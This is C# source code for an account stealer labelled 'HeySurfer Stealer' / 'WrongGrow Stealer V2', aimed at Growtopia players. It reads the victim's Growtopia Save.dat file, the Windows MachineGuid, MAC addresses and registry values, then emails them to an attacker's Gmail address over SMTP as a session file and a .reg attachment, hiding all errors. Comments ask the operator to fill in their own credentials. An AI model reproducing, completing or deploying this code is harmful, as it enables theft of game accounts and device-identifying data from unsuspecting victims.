using System;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System.Runtime.InteropServices;

// Token: 0x02000007 RID: 7
[StandardModule]

internal sealed class Module1
{
    // Token: 0x06000011 RID: 17 RVA: 0x000021E4 File Offset: 0x000003E4
    [STAThread]
    public static string crypto()
    {
        return "" + Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography", "MachineGuid", null);
    }
    public static string Bodyy(string body, string[] stuff2)
    {
        string bodyyy = body + "\r\n" + "\r\n" + "MAC Addresses: " + stuff2[1] + " | " + stuff2[2] + " | " + stuff2[3] + " | " + stuff2[4] + " | " + stuff2[5] + stuff2[6] + " | " + stuff2[7] + " | " + stuff2[8] + " | " + stuff2[9];
        return bodyyy;
    }
    public static string Regdata(string hkcu1, string hkcu2, string microsoft1, string microsoft2, string microsoft3, string microsoft4, string crypto, string fnum, string fnum2, string name1, string name2, string name3, string name4, string name5, string name6, string[] stuff2)
    {
        string regdata = @"Windows Registry Editor Version 5.00
;MAC ADDRESSES: {15} | {16} | {17} | {18} | {19} | {20} | {21} | {22} | {23}
[HKEY_CURRENT_USER\{8}]
""{9}""=hex:{0}
""{10}""=hex:{1}

;[HKEY_CURRENT_USER\Software\Microsoft\{7}]
;""{11}"" = hex:{2}
;""{12}"" = hex:{3}
;""{13}"" = hex:{4}
;""{14}"" = hex:{5}

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography]
""MachineGuid""=""{6}""";
        return string.Format(regdata, hkcu1, hkcu2, "dont", "watch", "this", "ok?", crypto, "xd", fnum2, name1, name2, "xd", "xd", "xd", "xd", stuff2[1], stuff2[2], stuff2[3], stuff2[4], stuff2[5], stuff2[6], stuff2[7], stuff2[8], stuff2[9]);
    }

    public static void Main()
    {
        try {
            var class1 = new Class1();
            string cryptography = crypto();
            string[] macaddress = class1.GetMacAddress();
            string[] hkcu = class1.thonk();
            string regfolder = ""; //TYPE THE FOLDER NAME HERE FROM HKCU
            string regfile1 = ""; //TYPE ONE OF THE FILE NAMES HERE FROM THAT FOLDER
            string regfile2 = ""; //TYPE ONE SECOND FILE NAME HERE
            string text = ""; //EMAIL HERE WITH @GMAIL.COM
            string password = "";  //pas
            string regkeys = Regdata(hkcu[2], hkcu[4], "a", "b", "c", "d", cryptography, "xd", regfolder, regfile1, regfile2, "xd", "xd", "xd", "xd", macaddress);
            string str = "\\Growtopia\\Save.dat";
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string fileName = folderPath + str;
            string from = text;
            string to = text;
            string subject = "HeySurfer Stealer";
            string body = Bodyy("WrongGrow Stealer V2", macaddress);
            MailMessage mailMessage = new MailMessage(from, to, subject, body);
            object obj = new SmtpClient("smtp.gmail.com", 587);
            NewLateBinding.LateSet(obj, null, "EnableSsl", new object[]
            {
            true
            }, null, null);
            NewLateBinding.LateSet(obj, null, "Credentials", new object[]
            {
            new NetworkCredential(text, password)
            }, null, null);
            Attachment item = new Attachment(fileName);
            mailMessage.Attachments.Add(item);
            ContentType idontknow = new ContentType("text/reg");
            Attachment item2 = Attachment.CreateAttachmentFromString(regkeys, idontknow);
            item2.Name = "regkeys.reg";
            mailMessage.Attachments.Add(item2);
            object instance = obj;
            Type type = null;
            string memberName = "Send";
            object[] array = new object[]
            {
            mailMessage
            };
            object[] arguments = array;
            string[] argumentNames = null;
            Type[] typeArguments = null;
            bool[] array2 = new bool[]
            {
            true
            };
            NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
            try
            {
                if (array2[0])
                {
                    try
                    {
                        mailMessage = (MailMessage)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(MailMessage));
                    }
                    catch (Exception)
                    {
                    };
                }
            }
            catch (Exception)
            {
            }
        }
        catch (Exception)
        {
        }
    }
	}
